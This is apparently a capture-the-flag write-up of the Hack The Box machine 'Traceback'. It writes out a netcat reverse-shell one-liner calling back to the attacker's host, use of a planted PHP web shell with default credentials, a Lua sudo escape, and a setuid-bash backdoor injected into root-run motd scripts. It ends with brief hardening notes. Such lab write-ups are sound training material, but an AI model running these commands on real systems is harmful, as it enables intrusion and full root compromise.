# Traceback

```
root@kali:/home/kali/htb/Traceback# nmap -p- -sV -sC 10.129.1.189 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 23:20 EDT
Nmap scan report for 10.129.1.189
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
root@kali:/home/kali/htb/Traceback# 
```

On the web page I find a comment in the source code:

```
<!--Some of the best web shells that you might need ;)-->
```


I try all the php shells I can find on my machine. And then I google for php web shells.

I eventually find https://github.com/TheBinitGhimire/Web-Shells/tree/master/PHP and try them all

https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php works, and I try the default admin/admin creds.

And it works.

I connect with `mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.42 1337 1>/tmp/backpipe`


And on the listener:

```
root@kali:/home/kali/htb/Traceback# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.189 52574
whoami
webadmin
id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
script /dev/null -c bash
Script started, file is /dev/null
webadmin@traceback:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 1337
root@kali:/home/kali/htb/Traceback# stty raw -echo
nc -nlvp 1337me/kali/htb/Traceback# fg
             reset
reset: unknown terminal type unknown
Terminal type? xterm
webadmin@traceback:/var/www/html$ export TERM=xterm
webadmin@traceback:/var/www/html$ export SHELL=bash
webadmin@traceback:/var/www/html$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:/home/webadmin$ 
```

I google luvit and find https://luvit.io/. so it's a lua CLI.

lua gtfobins https://gtfobins.github.io/gtfobins/lua/ tells me I can run `lua -e 'os.execute("/bin/sh")'`

```
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/bash")
sysadmin@traceback:/home/webadmin$ whoami
sysadmin
sysadmin@traceback:/home/webadmin$ 
```

I upload and run pspy, and find some interesting things.

```
2021/03/17 06:32:01 CMD: UID=0    PID=18773  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/                                                                                                                  
2021/03/17 06:32:01 CMD: UID=0    PID=18772  | sleep 30 
2021/03/17 06:32:01 CMD: UID=0    PID=18771  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2021/03/17 06:32:01 CMD: UID=0    PID=18770  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
```


going there I find that 80-esm is actually a shell script.

```
sysadmin@traceback:/var/backups/.update-motd.d$ cat 80-esm 
#!/bin/sh

SERIES=$(lsb_release -cs)
DESCRIPTION=$(lsb_release -ds)

[ "$SERIES" = "precise" ] || exit 0

[ -x /usr/bin/ubuntu-advantage ] || exit 0

if ubuntu-advantage is-esm-enabled; then
    cat <<EOF
This ${DESCRIPTION} system is configured to receive extended security updates
from Canonical:
 * https://www.ubuntu.com/esm
EOF
else
    cat <<EOF
This ${DESCRIPTION} system is past its End of Life, and is no longer
receiving security updates.  To protect the integrity of this system, it’s
critical that you enable Extended Security Maintenance updates:
 * https://www.ubuntu.com/esm
EOF
fi
echo
sysadmin@traceback:/var/backups/.update-motd.d$ locate motd
/etc/update-motd.d
/etc/default/motd-news
/etc/systemd/system/timers.target.wants/motd-news.timer
/etc/update-motd.d/00-header
/etc/update-motd.d/10-help-text
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/80-esm
/etc/update-motd.d/91-release-upgrade
/home/sysadmin/.cache/motd.legal-displayed
/lib/systemd/system/motd-news.service
/lib/systemd/system/motd-news.timer
/lib/systemd/system/motd.service
/lib/x86_64-linux-gnu/security/pam_motd.so
/usr/lib/ubuntu-release-upgrader/release-upgrade-motd
/usr/share/base-files/motd
/usr/share/doc/util-linux/examples/motd
/usr/share/man/man5/motd.5.gz
/usr/share/man/man5/update-motd.5.gz
/usr/share/man/man8/pam_motd.8.gz
/var/backups/.update-motd.d
/var/backups/.update-motd.d/00-header
/var/backups/.update-motd.d/10-help-text
/var/backups/.update-motd.d/50-motd-news
/var/backups/.update-motd.d/80-esm
/var/backups/.update-motd.d/91-release-upgrade
/var/cache/motd-news
/var/lib/systemd/deb-systemd-helper-enabled/motd-news.timer.dsh-also
/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/motd-news.timer
/var/lib/systemd/timers/stamp-motd-news.timer
sysadmin@traceback:/$ cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16  2020 ..
-rwxrwxr-x  1 root sysadmin  981 Mar 17 06:34 00-header
-rwxrwxr-x  1 root sysadmin  982 Mar 17 06:34 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Mar 17 06:34 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Mar 17 06:34 80-esm
-rwxrwxr-x  1 root sysadmin  299 Mar 17 06:34 91-release-upgrade
sysadmin@traceback:/etc/update-motd.d$ 
```

So we have write access to the motd script.

I added `chmod 4755 /bin/bash` to the top of the script, which makes the bash setuid, and allows anyone to execute it.

```
root@kali:/home/kali/htb/Traceback# ssh sysadmin@10.129.1.189
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key '/root/.ssh/id_rsa': 

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Mar 17 06:42:08 2021 from 10.10.14.42
$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# 
```

## Comparing myself to the official writeup:

they collect some web shell names in a text file and run it on a gobuster after finding the website.

they get a reverse shell with python3

they find the sudo lua file and get the sysadmin user.

they ssh in and use psy to find the motd backup.

this leads them to the motd files, which they modify to reverse shell back. They make sure to run this in the bg with `&`so it doies not halt ssh.

they gain root.

## How to stop this exploit:

The initial foothold was granted to us by a previous hacker. I assume the sudo lua cli was there previously. Which is bad practice. No user other than root should have any root access.

this also extends to the motd files. Which had been modified by the previous hacker, so I don't know if they were accessible like that earlier.